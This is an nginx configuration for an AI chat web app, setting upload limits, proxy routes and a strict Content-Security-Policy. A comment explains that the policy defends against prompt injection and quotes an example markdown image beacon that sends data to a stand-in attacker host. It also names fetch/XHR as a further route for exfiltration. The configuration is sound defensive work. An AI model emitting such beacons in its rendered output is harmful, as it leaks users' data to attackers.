server {
    listen 80;

    # Image/document attachments travel base64-encoded in the JSON body; nginx's default (1M) is too small.
    client_max_body_size 25M;

    # Uploads are parsed by pypdf/python-docx, which cost RAM and CPU well beyond the raw
    # bytes, so this one route is capped far below the server-wide limit — and refused here
    # rather than after nginx has spooled 25 MB to disk for the backend to reject.
    # Must stay in sync with MAX_UPLOAD_BYTES in backend/app/routers/extract.py, and with the
    # proxy directives in `location /api/` below.
    location = /api/extract {
        client_max_body_size 10M;
        proxy_pass http://calivi-backend:8000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
    }

    location /api/ {
        proxy_pass http://calivi-backend:8000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_buffering off;
        proxy_read_timeout 300s;
    }

    location /assets/ {
        root /usr/share/nginx/html;
        add_header Cache-Control "public, max-age=31536000, immutable";
    }

    location / {
        root /usr/share/nginx/html;
        add_header Cache-Control "no-cache";

        # Prompt injection / exfiltration defence: model output is rendered as markdown.
        # img-src 'self' data: → blocks a remote image beacon (![](http://attacker/leak?d=...))
        # while data: URI vision images keep working. connect-src 'self' → blocks exfiltration
        # via fetch/XHR. The Vite build uses external JS/CSS (assets); style-src 'unsafe-inline'
        # is required for React's inline style attributes (KaTeX injects inline styles too).
        # script-src: 'self' (Vite's external module bundle) + sha256 (the inline theme/accent
        # bootstrap script in index.html — it prevents a flash). 'unsafe-inline' is deliberately
        # ABSENT (the XSS defence is preserved).
        # If the bootstrap script is edited the hash must be recomputed, or the theme will flash.
        add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'sha256-99V2DXN0UTNRMkKyUnoVjwo6hKe7KHvPWhmTzG2kOpM='; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'none'; form-action 'self'" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Referrer-Policy "no-referrer" always;

        try_files $uri /index.html;
    }
}
